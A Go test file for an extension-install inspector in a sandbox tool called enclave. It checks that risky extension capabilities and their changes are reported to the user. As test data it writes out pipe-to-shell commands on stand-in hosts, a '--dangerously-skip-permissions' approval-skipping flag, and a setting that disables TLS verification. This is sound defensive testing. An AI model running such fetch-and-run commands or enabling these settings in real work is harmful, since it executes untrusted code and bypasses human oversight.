// Copyright (C) 2026 EclipseSource GmbH and others.
//
// This program and the accompanying materials are made available under the
// terms of the MIT License, which is available in the project root.
//
// SPDX-License-Identifier: MIT

package extinstall

import (
	"bytes"
	"path/filepath"
	"reflect"
	"strings"
	"testing"

	"enclave/internal/config"

	"enclave/internal/model"
)

const capabilitySpec = `schemaVersion: "1"
kind: mixin
name: foo
needsRoot: true
aptPackages:
  - gdb
configDir: .config/foo
authFiles:
  - hosts.yml
sandbox:
  entrypoint:
    run: [foo, --serve]
  passthroughPaths:
    - agents/
  hostConfigDir: .foo
  hostCredentialsFile: .credentials.json
  hostOauthJson: .foo.json
commands:
  startup:
    - command: foo --serve
      description: start foo
  initFiles:
    - path: ${WORKDIR}/.foo.yaml
      content: "{}"
network:
  allowedDomains:
    - api.acme.com
  serviceDomains:
    cdn.acme.com: acme
  serviceAuth:
    acme:
      headerName: X-Acme-Token
      hosts: [api.acme.com]
environment:
  variables:
    NODE_TLS_REJECT_UNAUTHORIZED: "0"
credentials:
  sources:
    acme:
      env:
        - ACME_TOKEN
      file:
        path: ~/.acme/token
        parser: json
providers:
  - name: acme
    authFiles: [config.json]
    authSession:
      mode: any
    oauthPorts:
      - { port: "1455" }
    securestorageDirEnv: ACME_SECURESTORAGE_DIR
ports:
  - container: 8080
    publish: true
`

func capabilityFixture(t *testing.T) string {
	t.Helper()
	dir := t.TempDir()
	writeFixture(t, filepath.Join(dir, "spec.yaml"), capabilitySpec, 0o644)
	writeFixture(t, filepath.Join(dir, "install.sh"), "#!/bin/sh\n", 0o755)
	writeFixture(t, filepath.Join(dir, "feature-entrypoint.d", "setup.sh"), "#!/bin/sh\n", 0o755)
	writeFixture(t, filepath.Join(dir, "gateway-allowlist.conf"),
		"server=/cdn.acme.com/10.0.0.1\nconf-file=/etc/dnsmasq.d/extra.conf\n", 0o644)
	writeFixture(t, filepath.Join(dir, "go", "handler.go"), "package main\n", 0o644)
	writeFixture(t, filepath.Join(dir, "skills", "review", "SKILL.md"), "# review\n", 0o644)
	writeFixture(t, filepath.Join(dir, "files", "workspace", "README.md"), "# project readme\n", 0o644)
	writeFixture(t, filepath.Join(dir, "files", "home", ".gitconfig"), "[user]\n", 0o644)
	return dir
}

func TestInspectReportsCapabilities(t *testing.T) {
	caps, err := inspect(capabilityFixture(t), model.KindFeature)
	if err != nil {
		t.Fatalf("inspect: %v", err)
	}
	if !caps.InstallScript || !caps.Spec.NeedsRoot {
		t.Errorf("install/root = %v/%v, want both true", caps.InstallScript, caps.Spec.NeedsRoot)
	}
	if len(caps.StartupScripts) != 1 || !strings.Contains(caps.StartupScripts[0], "setup.sh") {
		t.Errorf("StartupScripts = %v", caps.StartupScripts)
	}
	if len(caps.Spec.StartupCommands) != 1 {
		t.Errorf("StartupCommands = %v", caps.Spec.StartupCommands)
	}
	if len(caps.AllowDomains) != 2 {
		t.Errorf("AllowDomains = %v, want the spec domain and the allowlist file", caps.AllowDomains)
	}
	if len(caps.AllowlistDirectives) != 1 || caps.AllowlistDirectives[0] != "conf-file=/etc/dnsmasq.d/extra.conf" {
		t.Errorf("AllowlistDirectives = %v, want the conf-file include reported verbatim", caps.AllowlistDirectives)
	}
	if len(caps.Skills) != 1 || caps.Skills[0] != "review" {
		t.Errorf("Skills = %v, want the staged skill name", caps.Skills)
	}
	if len(caps.Spec.Ports) != 1 || caps.Spec.Ports[0].Container != 8080 {
		t.Errorf("Ports = %v", caps.Spec.Ports)
	}
	if len(caps.Spec.CredentialEnv) != 1 || caps.Spec.CredentialEnv[0] != "ACME_TOKEN" {
		t.Errorf("CredentialEnv = %v", caps.Spec.CredentialEnv)
	}
	if len(caps.Spec.InitFiles) != 1 || !writesIntoProject(caps.Spec.InitFiles[0].Path) || caps.Spec.InitFiles[0].OnlyIfMissing {
		t.Errorf("InitFiles = %+v", caps.Spec.InitFiles)
	}
	if !caps.IgnoredGoDir {
		t.Error("IgnoredGoDir = false, want true")
	}
	if caps.Files == 0 {
		t.Error("Files = 0, want the fixture file count")
	}
	if caps.Spec.EntrypointOverride != "foo --serve" {
		t.Errorf("EntrypointOverride = %q, want %q", caps.Spec.EntrypointOverride, "foo --serve")
	}
	if len(caps.Spec.EnvironmentVars) != 1 || caps.Spec.EnvironmentVars[0] != "NODE_TLS_REJECT_UNAUTHORIZED=0" {
		t.Errorf("EnvironmentVars = %v", caps.Spec.EnvironmentVars)
	}
	if len(caps.Spec.CredentialSources) != 1 {
		t.Fatalf("CredentialSources = %v, want one entry", caps.Spec.CredentialSources)
	}
	cs := caps.Spec.CredentialSources[0]
	if cs.ID != "acme" || cs.FilePath != "~/.acme/token" || cs.FileParser != "json" {
		t.Errorf("CredentialSources[0] file fields = %+v", cs)
	}
	if cs.ReleaseHeader != "X-Acme-Token" || len(cs.ReleaseHosts) != 2 {
		t.Errorf("CredentialSources[0] release fields = %+v, want header X-Acme-Token and 2 hosts", cs)
	}
	if len(caps.Spec.Providers) != 1 {
		t.Fatalf("Providers = %v, want one entry", caps.Spec.Providers)
	}
	provider := caps.Spec.Providers[0]
	if provider.Name != "acme" || len(provider.AuthFiles) != 1 || !provider.AuthSession || provider.AuthSessionMode != "any" {
		t.Errorf("Providers[0] = %+v", provider)
	}
	if len(provider.OAuthPorts) != 1 || provider.OAuthPorts[0] != "1455" {
		t.Errorf("Providers[0].OAuthPorts = %v", provider.OAuthPorts)
	}
	if provider.SecurestorageDirEnv != "ACME_SECURESTORAGE_DIR" {
		t.Errorf("Providers[0].SecurestorageDirEnv = %q", provider.SecurestorageDirEnv)
	}
	if len(caps.allPorts()) != 2 {
		t.Errorf("allPorts() = %v, want the spec port and the provider's oauth port folded together", caps.allPorts())
	}
	hosts := caps.Spec.HostExposure
	if len(hosts.PassthroughPaths) != 1 || hosts.PassthroughPaths[0] != "agents/" {
		t.Errorf("PassthroughPaths = %v", hosts.PassthroughPaths)
	}
	if hosts.HostConfigDir != ".foo" || hosts.HostCredentialsFile != ".credentials.json" || hosts.HostOAuthJSON != ".foo.json" {
		t.Errorf("host exposure = configDir=%q credentialsFile=%q oauthJson=%q", hosts.HostConfigDir, hosts.HostCredentialsFile, hosts.HostOAuthJSON)
	}
	if hosts.MixinConfigDir != ".config/foo" || len(hosts.MixinAuthFiles) != 1 || hosts.MixinAuthFiles[0] != "hosts.yml" {
		t.Errorf("mixin exposure = configDir=%q authFiles=%v", hosts.MixinConfigDir, hosts.MixinAuthFiles)
	}
	if len(caps.WorkspaceFiles) != 1 || caps.WorkspaceFiles[0] != "README.md" {
		t.Errorf("WorkspaceFiles = %v", caps.WorkspaceFiles)
	}
	if len(caps.HomeFiles) != 1 || caps.HomeFiles[0] != ".gitconfig" {
		t.Errorf("HomeFiles = %v", caps.HomeFiles)
	}
}

func TestRenderIncludesEveryReportedCapability(t *testing.T) {
	caps, err := inspect(capabilityFixture(t), model.KindFeature)
	if err != nil {
		t.Fatalf("inspect: %v", err)
	}
	var out bytes.Buffer
	caps.render(&out, Style{}, "acme/kits")
	rendered := out.String()
	for _, want := range []string{
		"acme/kits", "install.sh", "needsRoot", "api.acme.com", "8080", "ACME_TOKEN", "go/",
		"conf-file=/etc/dnsmasq.d/extra.conf", "review",
		"foo --serve", "NODE_TLS_REJECT_UNAUTHORIZED=0", "X-Acme-Token", "~/.acme/token", "json",
		"ACME_SECURESTORAGE_DIR", "1455", "agents/", ".credentials.json", ".foo.json",
		".config/foo", "hosts.yml", "README.md", ".gitconfig",
	} {
		if !strings.Contains(rendered, want) {
			t.Errorf("rendered summary is missing %q:\n%s", want, rendered)
		}
	}
}

func TestRenderOmitsEmptyLines(t *testing.T) {
	dir := t.TempDir()
	writeFixture(t, filepath.Join(dir, "spec.yaml"), "schemaVersion: \"1\"\nkind: mixin\nname: bare\n", 0o644)
	caps, err := inspect(dir, model.KindFeature)
	if err != nil {
		t.Fatalf("inspect: %v", err)
	}
	var out bytes.Buffer
	caps.render(&out, Style{}, "")
	for _, unwanted := range []string{
		"allowlist domains", "allowlist directives", "credentials", "ports", "go/", "skills",
		"entrypoint override", "environment vars", "provider", "passthrough paths",
		"host config dir", "host credentials file", "host oauth json",
		"mixin config dir", "mixin auth files", "workspace files", "home files",
		"credential →", "credential file", "skips approval",
	} {
		if strings.Contains(out.String(), unwanted) {
			t.Errorf("rendered summary should omit %q:\n%s", unwanted, out.String())
		}
	}
}

func TestDiffCapabilities(t *testing.T) {
	before := capabilities{AllowDomains: []string{"api.acme.com"}}
	after := capabilities{
		Spec:         config.SpecSummary{NeedsRoot: true, CredentialEnv: []string{"ACME_TOKEN"}},
		AllowDomains: []string{"api.acme.com", "new.acme.com"},
	}
	changes := diffCapabilities(before, after)
	joined := strings.Join(changes, "\n")
	if !strings.Contains(joined, "new.acme.com") {
		t.Errorf("diff omits the added domain: %v", changes)
	}
	if !strings.Contains(joined, "root") {
		t.Errorf("diff omits the newly required root install: %v", changes)
	}
	if !strings.Contains(joined, "ACME_TOKEN") {
		t.Errorf("diff omits the added credential: %v", changes)
	}
	if len(diffCapabilities(after, after)) != 0 {
		t.Error("identical capabilities produced a diff")
	}
}

// TestDiffCapabilitiesReportsDroppedAndDerivedFields covers the three diff
// behaviours the per-field guard below cannot reach: it always compares a zero
// "before" against a populated "after", so it never exercises the drop
// direction of a boolean capability, and its single-field cases do not populate
// the two fields whose diff text comes from a describe helper rather than the
// field value.
func TestDiffCapabilitiesReportsDroppedAndDerivedFields(t *testing.T) {
	cases := []struct {
		name   string
		before capabilities
		after  capabilities
		want   string
	}{
		{
			name:   "install script removed",
			before: capabilities{InstallScript: true},
			after:  capabilities{},
			want:   "drops install.sh",
		},
		{
			name:   "credential file source",
			before: capabilities{},
			after: capabilities{Spec: config.SpecSummary{CredentialSources: []config.SpecCredentialSource{
				{ID: "acme", FilePath: "~/.acme/token", FileParser: "json"},
			}}},
			want: "~/.acme/token",
		},
		{
			name:   "provider oauth port folded into ports",
			before: capabilities{},
			after: capabilities{Spec: config.SpecSummary{
				Providers: []config.SpecProviderSummary{{Name: "acme", OAuthPorts: []string{"1455"}}},
			}},
			want: "1455",
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			changes := diffCapabilities(tc.before, tc.after)
			if joined := strings.Join(changes, "\n"); !strings.Contains(joined, tc.want) {
				t.Errorf("diff missing %q: %v", tc.want, changes)
			}
		})
	}
}

// TestDiffCapabilitiesNoDiffWhenIdentical exercises every field populated at
// once (via the shared capability fixture) to catch a diff helper that false-
// positives on equal inputs.
func TestDiffCapabilitiesNoDiffWhenIdentical(t *testing.T) {
	caps, err := inspect(capabilityFixture(t), model.KindFeature)
	if err != nil {
		t.Fatalf("inspect: %v", err)
	}
	if changes := diffCapabilities(caps, caps); len(changes) != 0 {
		t.Errorf("identical capabilities produced a diff: %v", changes)
	}
}

func TestDiffCapabilitiesReportsAddedAllowlistDirectiveAndSkill(t *testing.T) {
	before := capabilities{}
	after := capabilities{
		AllowlistDirectives: []string{"conf-file=/etc/dnsmasq.d/extra.conf"},
		Skills:              []string{"review"},
	}
	changes := diffCapabilities(before, after)
	joined := strings.Join(changes, "\n")
	if !strings.Contains(joined, "conf-file=/etc/dnsmasq.d/extra.conf") {
		t.Errorf("diff omits the added allowlist directive: %v", changes)
	}
	if !strings.Contains(joined, "review") {
		t.Errorf("diff omits the added skill: %v", changes)
	}
}

// yoloFixture writes a kind: sandbox spec declaring sandbox.yoloFlag, with the
// caller supplying (or omitting) the yoloEnabled line — sandbox.yoloEnabled
// defaults to true when unset, which is the dangerous case: a bare yoloFlag is
// enough to make the agent skip its own per-action approval step.
func yoloFixture(t *testing.T, yoloEnabledLine string) string {
	t.Helper()
	dir := t.TempDir()
	spec := "schemaVersion: \"1\"\nkind: sandbox\nname: footool\nsandbox:\n  yoloFlag: --dangerously-skip-permissions\n" + yoloEnabledLine
	writeFixture(t, filepath.Join(dir, "spec.yaml"), spec, 0o644)
	return dir
}

func TestInspectYoloDefaultsToEnabled(t *testing.T) {
	caps, err := inspect(yoloFixture(t, ""), model.KindTool)
	if err != nil {
		t.Fatalf("inspect: %v", err)
	}
	if caps.Spec.YoloFlag != "--dangerously-skip-permissions" || !caps.Spec.YoloEnabled {
		t.Errorf("YoloFlag/YoloEnabled = %q/%v, want the flag with default-true", caps.Spec.YoloFlag, caps.Spec.YoloEnabled)
	}
	var out bytes.Buffer
	caps.render(&out, Style{}, "")
	if !strings.Contains(out.String(), "skips approval") || !strings.Contains(out.String(), "--dangerously-skip-permissions") {
		t.Errorf("rendered summary should report the default-enabled yolo flag:\n%s", out.String())
	}
}

func TestInspectYoloExplicitlyDisabledIsNotRendered(t *testing.T) {
	caps, err := inspect(yoloFixture(t, "  yoloEnabled: false\n"), model.KindTool)
	if err != nil {
		t.Fatalf("inspect: %v", err)
	}
	if caps.Spec.YoloEnabled {
		t.Error("YoloEnabled = true, want false (explicit yoloEnabled: false)")
	}
	var out bytes.Buffer
	caps.render(&out, Style{}, "")
	if strings.Contains(out.String(), "skips approval") {
		t.Errorf("rendered summary should omit skips approval when yoloEnabled is explicitly false:\n%s", out.String())
	}
}

// TestInspectReportsRootInstallCommands pins that a commands.install entry with
// no user field is reported as root even though needsRoot is false: needsRoot
// only routes install.sh, so it cannot stand in as the privilege marker for
// declarative install steps.
func TestInspectReportsRootInstallCommands(t *testing.T) {
	dir := t.TempDir()
	writeFixture(t, filepath.Join(dir, "spec.yaml"), `schemaVersion: "1"
kind: mixin
name: helper
commands:
  install:
    - command: apt-get install -y jq
    - command: echo hi
      user: agent
    - command: echo explicit
      user: root
`, 0o644)

	caps, err := inspect(dir, model.KindFeature)
	if err != nil {
		t.Fatalf("inspect: %v", err)
	}
	if caps.Spec.NeedsRoot {
		t.Fatal("NeedsRoot = true, want false: the fixture omits needsRoot")
	}
	if len(caps.Spec.InstallCommands) != 3 {
		t.Errorf("InstallCommands = %v, want 3 entries", caps.Spec.InstallCommands)
	}
	if caps.Spec.InstallCommandsAsRoot != 2 {
		t.Errorf("InstallCommandsAsRoot = %d, want 2 (the omitted user and the explicit root)", caps.Spec.InstallCommandsAsRoot)
	}

	var out bytes.Buffer
	caps.render(&out, Style{}, "")
	if !strings.Contains(out.String(), "commands.install (3, 2 as root)") {
		t.Errorf("rendered summary must disclose the root steps:\n%s", out.String())
	}
}

// TestInspectScansTreeOnce pins what one walk of an extension tree has to
// report: exact file and byte totals with the provenance sidecar excluded, the
// startup scripts this kind's entrypoint directory actually runs, only the
// immediate entries of skills/, and files/ paths relative to their own subtree
// root. A feature's entrypoint.d never runs — entrypoint.sh sources that
// directory from the selected tool alone — and neither does a non-".sh" file
// in a directory that does run, so neither may be summarized as a startup
// script.
func TestInspectScansTreeOnce(t *testing.T) {
	dir := t.TempDir()
	content := map[string]string{
		"spec.yaml":                            "schemaVersion: \"1\"\nkind: mixin\nname: foo\n",
		"entrypoint.d/20-late.sh":              "#!/bin/sh\n",
		"feature-entrypoint.d/10-early.sh":     "#!/bin/sh\n",
		"feature-entrypoint.d/05-first.sh":     "#!/bin/sh\n",
		"feature-entrypoint.d/README.md":       "not a script\n",
		"skills/review/SKILL.md":               "# review\n",
		"skills/loose.md":                      "loose\n",
		"files/workspace/docs/guide.md":        "guide\n",
		"files/home/.config/foo/settings.toml": "a = 1\n",
	}
	wantBytes := int64(0)
	for rel, body := range content {
		writeFixture(t, filepath.Join(dir, filepath.FromSlash(rel)), body, 0o644)
		wantBytes += int64(len(body))
	}
	writeFixture(t, filepath.Join(dir, model.ExtensionSourceFilename), `{"schemaVersion":"1"}`, 0o644)

	caps, err := inspect(dir, model.KindFeature)
	if err != nil {
		t.Fatalf("inspect: %v", err)
	}
	if caps.Files != len(content) || caps.Bytes != wantBytes {
		t.Errorf("content = %d files/%d bytes, want %d/%d (sidecar excluded)", caps.Files, caps.Bytes, len(content), wantBytes)
	}
	wantScripts := []string{"feature-entrypoint.d/05-first.sh", "feature-entrypoint.d/10-early.sh"}
	if !reflect.DeepEqual(caps.StartupScripts, wantScripts) {
		t.Errorf("StartupScripts = %v, want %v", caps.StartupScripts, wantScripts)
	}
	if want := []string{"loose.md", "review"}; !reflect.DeepEqual(caps.Skills, want) {
		t.Errorf("Skills = %v, want %v", caps.Skills, want)
	}
	if want := []string{"docs/guide.md"}; !reflect.DeepEqual(caps.WorkspaceFiles, want) {
		t.Errorf("WorkspaceFiles = %v, want %v", caps.WorkspaceFiles, want)
	}
	if want := []string{".config/foo/settings.toml"}; !reflect.DeepEqual(caps.HomeFiles, want) {
		t.Errorf("HomeFiles = %v, want %v", caps.HomeFiles, want)
	}
}

// TestInspectReportsToolEntrypointScripts pins the other side of the entrypoint
// split TestInspectScansTreeOnce covers for a feature: entrypoint.d belongs to
// the selected tool, so a tool's scripts there do run and must be disclosed,
// while feature-entrypoint.d in a tool never does.
func TestInspectReportsToolEntrypointScripts(t *testing.T) {
	dir := t.TempDir()
	writeFixture(t, filepath.Join(dir, "spec.yaml"), "schemaVersion: \"1\"\nkind: sandbox\nname: probe\n", 0o644)
	writeFixture(t, filepath.Join(dir, "entrypoint.d", "10-setup.sh"), "#!/bin/sh\n", 0o755)
	writeFixture(t, filepath.Join(dir, "feature-entrypoint.d", "20-never.sh"), "#!/bin/sh\n", 0o755)

	caps, err := inspect(dir, model.KindTool)
	if err != nil {
		t.Fatalf("inspect: %v", err)
	}
	if want := []string{"entrypoint.d/10-setup.sh"}; !reflect.DeepEqual(caps.StartupScripts, want) {
		t.Errorf("StartupScripts = %v, want %v", caps.StartupScripts, want)
	}
}

// TestInspectReportsUpdateProbe pins that check-update.sh is disclosed for a
// tool. enclave executes it in a container on the ordinary run path once the
// update interval elapses, so an extension that ships one gets a recurring
// execution channel that the summary has to name.
func TestInspectReportsUpdateProbe(t *testing.T) {
	dir := t.TempDir()
	writeFixture(t, filepath.Join(dir, "spec.yaml"), "schemaVersion: \"1\"\nkind: sandbox\nname: probe\n", 0o644)
	writeFixture(t, filepath.Join(dir, "check-update.sh"), "#!/bin/sh\necho 1.0.0\n", 0o755)

	caps, err := inspect(dir, model.KindTool)
	if err != nil {
		t.Fatalf("inspect: %v", err)
	}
	if !caps.UpdateProbe {
		t.Fatal("UpdateProbe = false, want true")
	}
	var out bytes.Buffer
	caps.render(&out, Style{}, "")
	if !strings.Contains(out.String(), "update probe") || !strings.Contains(out.String(), "check-update.sh") {
		t.Errorf("rendered summary must name the update probe:\n%s", out.String())
	}
}

// TestInspectIgnoresUpdateProbeForFeature pins the other side: the automatic
// update check resolves the probe through ResolveToolFile, so the same file in
// a feature never runs and must not be reported as if it did.
func TestInspectIgnoresUpdateProbeForFeature(t *testing.T) {
	dir := t.TempDir()
	writeFixture(t, filepath.Join(dir, "spec.yaml"), "schemaVersion: \"1\"\nkind: mixin\nname: probe\n", 0o644)
	writeFixture(t, filepath.Join(dir, "check-update.sh"), "#!/bin/sh\necho 1.0.0\n", 0o755)

	caps, err := inspect(dir, model.KindFeature)
	if err != nil {
		t.Fatalf("inspect: %v", err)
	}
	if caps.UpdateProbe {
		t.Error("UpdateProbe = true, want false: a feature's check-update.sh is never executed")
	}
}

// TestDiffCapabilitiesReportsAddedUpdateProbe covers an update that introduces
// the probe, which otherwise moves only the anonymous content counts.
func TestDiffCapabilitiesReportsAddedUpdateProbe(t *testing.T) {
	changes := diffCapabilities(capabilities{}, capabilities{UpdateProbe: true})
	if !strings.Contains(strings.Join(changes, "\n"), "adds check-update.sh") {
		t.Errorf("diffCapabilities = %v, want the added probe reported", changes)
	}
}

// TestDiffCapabilitiesReportsRewrittenEnvValueAndInitFile covers the two
// remaining places where a spec can change what an extension does while the
// shape of the document stays identical: an environment variable keeps its
// name and changes its value, and an initFiles entry keeps its path and
// changes the content kit-init.sh writes at every start.
func TestDiffCapabilitiesReportsRewrittenEnvValueAndInitFile(t *testing.T) {
	dir := t.TempDir()
	specFor := func(tlsValue string, content string) string {
		return "schemaVersion: \"1\"\nkind: mixin\nname: helper\n" +
			"environment:\n  variables:\n    NODE_TLS_REJECT_UNAUTHORIZED: \"" + tlsValue + "\"\n" +
			"commands:\n  initFiles:\n    - path: ${WORKDIR}/.helper.yaml\n      content: \"" + content + "\"\n"
	}
	writeFixture(t, filepath.Join(dir, "spec.yaml"), specFor("1", "safe"), 0o644)
	before, err := inspect(dir, model.KindFeature)
	if err != nil {
		t.Fatalf("inspect(before): %v", err)
	}
	writeFixture(t, filepath.Join(dir, "spec.yaml"), specFor("0", "rewritten"), 0o644)
	after, err := inspect(dir, model.KindFeature)
	if err != nil {
		t.Fatalf("inspect(after): %v", err)
	}

	joined := strings.Join(diffCapabilities(before, after), "\n")
	if !strings.Contains(joined, "NODE_TLS_REJECT_UNAUTHORIZED=0") {
		t.Errorf("diffCapabilities = %q, want the new environment value reported", joined)
	}
	if !strings.Contains(joined, "init file") || !strings.Contains(joined, "content=") {
		t.Errorf("diffCapabilities = %q, want the rewritten init-file content reported", joined)
	}
}

// TestDiffCapabilitiesReportsRewrittenInstallCommand covers the update this
// summary exists to catch: the step count is unchanged, so nothing about the
// shape of commands.install differs — only the shell that runs at image build.
func TestDiffCapabilitiesReportsRewrittenInstallCommand(t *testing.T) {
	before := capabilities{Spec: config.SpecSummary{InstallCommands: []string{"curl https://known.example/i.sh | sh"}}}
	after := capabilities{Spec: config.SpecSummary{InstallCommands: []string{"curl https://elsewhere.example/i.sh | sh"}}}
	joined := strings.Join(diffCapabilities(before, after), "\n")
	if !strings.Contains(joined, "elsewhere.example") || !strings.Contains(joined, "known.example") {
		t.Errorf("diffCapabilities = %q, want the rewritten install command named on both sides", joined)
	}
}

// TestDiffCapabilitiesReportsRewrittenStartupCommandUnderSameDescription is the
// same hole one level down: commands.startup entries carry an author-written
// description, and projecting that instead of the command would let a rewrite
// hide behind an unchanged description.
func TestDiffCapabilitiesReportsRewrittenStartupCommandUnderSameDescription(t *testing.T) {
	dir := t.TempDir()
	specFor := func(command string) string {
		return "schemaVersion: \"1\"\nkind: mixin\nname: helper\ncommands:\n  startup:\n" +
			"    - command: " + command + "\n      description: prepare the workspace\n"
	}
	writeFixture(t, filepath.Join(dir, "spec.yaml"), specFor("echo hi"), 0o644)
	before, err := inspect(dir, model.KindFeature)
	if err != nil {
		t.Fatalf("inspect(before): %v", err)
	}
	writeFixture(t, filepath.Join(dir, "spec.yaml"), specFor("curl https://elsewhere.example | sh"), 0o644)
	after, err := inspect(dir, model.KindFeature)
	if err != nil {
		t.Fatalf("inspect(after): %v", err)
	}
	joined := strings.Join(diffCapabilities(before, after), "\n")
	if !strings.Contains(joined, "elsewhere.example") {
		t.Errorf("diffCapabilities = %q, want the rewritten startup command reported", joined)
	}
}

// TestDiffCapabilitiesReportsInstallCommandTurningRoot covers an update that
// keeps the step count identical but drops a user field, promoting a step to
// root.
func TestDiffCapabilitiesReportsInstallCommandTurningRoot(t *testing.T) {
	before := capabilities{Spec: config.SpecSummary{InstallCommands: []string{"make", "echo hi"}}}
	after := capabilities{Spec: config.SpecSummary{
		InstallCommands:       []string{"make", "(root) echo hi"},
		InstallCommandsAsRoot: 1,
	}}
	changes := diffCapabilities(before, after)
	joined := strings.Join(changes, "\n")
	if !strings.Contains(joined, "root install command") {
		t.Errorf("diffCapabilities = %v, want a root install command change", changes)
	}
}

func TestDiffCapabilitiesReportsNewlyEnabledYolo(t *testing.T) {
	before := capabilities{}
	after := capabilities{Spec: config.SpecSummary{
		YoloFlag:    "--dangerously-skip-permissions",
		YoloEnabled: true,
	}}
	changes := diffCapabilities(before, after)
	joined := strings.Join(changes, "\n")
	if !strings.Contains(joined, "skips approval") || !strings.Contains(joined, "--dangerously-skip-permissions") {
		t.Errorf("diff omits the newly enabled yolo flag: %v", changes)
	}
	if len(diffCapabilities(after, after)) != 0 {
		t.Error("identical yolo capabilities produced a diff")
	}
}

// capabilityFieldCase drives the structural completeness guard below: how to
// set one capabilities field to a representative non-zero value, a substring
// expected to appear in render's output once it is set, and a substring
// expected in the diffCapabilities line that reports it as newly added.
type capabilityFieldCase struct {
	set        func(c *capabilities)
	wantRender string
	wantDiff   string
}

// capabilityFieldCases enumerates every capability-bearing field this generic
// sweep can exercise in isolation, keyed by its dotted path from capabilities
// — including the fields of the embedded config.SpecSummary, which is where
// most of them live. A field missing here must be listed, with a reason, in
// the exemption set inside TestCapabilitiesFieldsParticipateInRenderAndDiff
// instead; reflection over the struct catches one that is in neither place.
func capabilityFieldCases() map[string]capabilityFieldCase {
	return map[string]capabilityFieldCase{
		"InstallScript": {func(c *capabilities) { c.InstallScript = true }, "install.sh", "adds install.sh"},
		"Spec.InstallCommands": {func(c *capabilities) { c.Spec.InstallCommands = []string{"make install"} },
			"commands.install", "install command make install"},
		// Only renders alongside a non-empty InstallCommands, so the setter also
		// sets that; the markers below are what only InstallCommandsAsRoot produces.
		"Spec.InstallCommandsAsRoot": {func(c *capabilities) {
			c.Spec.InstallCommands = []string{"make install"}
			c.Spec.InstallCommandsAsRoot = 1
		}, "1 as root", "root install command"},
		"Spec.NeedsRoot":          {func(c *capabilities) { c.Spec.NeedsRoot = true }, "needsRoot", "now installs as root"},
		"UpdateProbe":             {func(c *capabilities) { c.UpdateProbe = true }, "check-update.sh", "adds check-update.sh"},
		"StartupScripts":          {func(c *capabilities) { c.StartupScripts = []string{"entrypoint.d/x.sh"} }, "entrypoint.d/x.sh", "startup script"},
		"Spec.StartupCommands":    {func(c *capabilities) { c.Spec.StartupCommands = []string{"echo hi"} }, "commands.startup", "startup command"},
		"Spec.EntrypointOverride": {func(c *capabilities) { c.Spec.EntrypointOverride = "foo --serve" }, "foo --serve", "entrypoint override"},
		"Spec.EnvironmentVars":    {func(c *capabilities) { c.Spec.EnvironmentVars = []string{"FOO_ENV=1"} }, "FOO_ENV=1", "environment var FOO_ENV=1"},
		"AllowDomains":            {func(c *capabilities) { c.AllowDomains = []string{"marker.example"} }, "marker.example", "allowlist domain marker.example"},
		"AllowlistDirectives":     {func(c *capabilities) { c.AllowlistDirectives = []string{"conf-file=/x"} }, "conf-file=/x", "allowlist directive conf-file=/x"},
		"Spec.DeniedDomains":      {func(c *capabilities) { c.Spec.DeniedDomains = []string{"deny.example"} }, "deny.example", "denied domain deny.example"},
		"Spec.Ports": {func(c *capabilities) { c.Spec.Ports = []config.SpecPortSummary{{Container: 12345, Publish: true}} },
			"12345 (published on the host)", "port 12345 (published on the host)"},
		"Spec.ContinueArgs": {func(c *capabilities) { c.Spec.ContinueArgs = "resume --last" }, "resume --last", "continue args"},
		"Spec.ResumeArgs":   {func(c *capabilities) { c.Spec.ResumeArgs = "resume" }, "resume", "resume args"},
		"Spec.PostStartOpenIDE": {func(c *capabilities) { c.Spec.PostStartOpenIDE = "theia" },
			"launched on the host", "post-start IDE launch"},
		"Spec.CredentialEnv": {func(c *capabilities) { c.Spec.CredentialEnv = []string{"MY_TOKEN"} }, "MY_TOKEN", "credential MY_TOKEN"},
		"Spec.CredentialSources": {func(c *capabilities) {
			c.Spec.CredentialSources = []config.SpecCredentialSource{{ID: "acme", ReleaseHeader: "X-Acme", ReleaseHosts: []string{"api.acme.com"}}}
		}, "X-Acme", "credential grant acme header=X-Acme"},
		"Spec.ProxyManaged": {func(c *capabilities) { c.Spec.ProxyManaged = []string{"HTTP_PROXY"} }, "HTTP_PROXY", "proxy-managed alias HTTP_PROXY"},
		"Spec.Providers":    {func(c *capabilities) { c.Spec.Providers = []config.SpecProviderSummary{{Name: "acme"}} }, "acme", "provider acme"},
		"Spec.HostExposure.PassthroughPaths": {func(c *capabilities) { c.Spec.HostExposure.PassthroughPaths = []string{"agents/"} },
			"agents/", "passthrough path agents/"},
		"Spec.HostExposure.HostConfigDir": {func(c *capabilities) { c.Spec.HostExposure.HostConfigDir = ".foo" },
			".foo", "host config dir"},
		"Spec.HostExposure.HostCredentialsFile": {func(c *capabilities) { c.Spec.HostExposure.HostCredentialsFile = ".credentials.json" },
			".credentials.json", "host credentials file"},
		"Spec.HostExposure.HostOAuthJSON": {func(c *capabilities) { c.Spec.HostExposure.HostOAuthJSON = ".foo.json" },
			".foo.json", "host oauth json"},
		"Spec.HostExposure.MixinConfigDir": {func(c *capabilities) { c.Spec.HostExposure.MixinConfigDir = ".config/foo" },
			".config/foo", "mixin config dir"},
		"Spec.HostExposure.MixinAuthFiles": {func(c *capabilities) { c.Spec.HostExposure.MixinAuthFiles = []string{"hosts.yml"} },
			"hosts.yml", "mixin auth file hosts.yml"},
		"Spec.InitFiles": {func(c *capabilities) { c.Spec.InitFiles = []config.SpecInitFileSummary{{Path: "${WORKDIR}/.foo.yaml"}} },
			"${WORKDIR}/.foo.yaml", "init file ${WORKDIR}/.foo.yaml"},
		"Spec.AptPackages": {func(c *capabilities) { c.Spec.AptPackages = []string{"gdb"} }, "gdb", "apt package gdb"},
		"Skills":           {func(c *capabilities) { c.Skills = []string{"review"} }, "review", "skill review"},
		"WorkspaceFiles":   {func(c *capabilities) { c.WorkspaceFiles = []string{"README.md"} }, "README.md", "workspace file README.md"},
		"HomeFiles":        {func(c *capabilities) { c.HomeFiles = []string{".gitconfig"} }, ".gitconfig", "home file .gitconfig"},
		"IgnoredGoDir":     {func(c *capabilities) { c.IgnoredGoDir = true }, "go/ handlers", "adds ignored go/ handlers"},
		"Files":            {func(c *capabilities) { c.Files = 3 }, "3 files", "staged content changes"},
		// Bytes only renders alongside Files>0 (the "content" row is guarded
		// by c.Files > 0), so its setter also sets Files; the field under test
		// is still Bytes (the markers below are Bytes' own value, not Files').
		"Bytes": {func(c *capabilities) { c.Files = 1; c.Bytes = 999 }, "999 bytes", "999 bytes"},
	}
}

// capabilityFieldPaths lists every leaf field reachable from typ by dotted
// path, descending into struct-valued fields so that capabilities.Spec (and
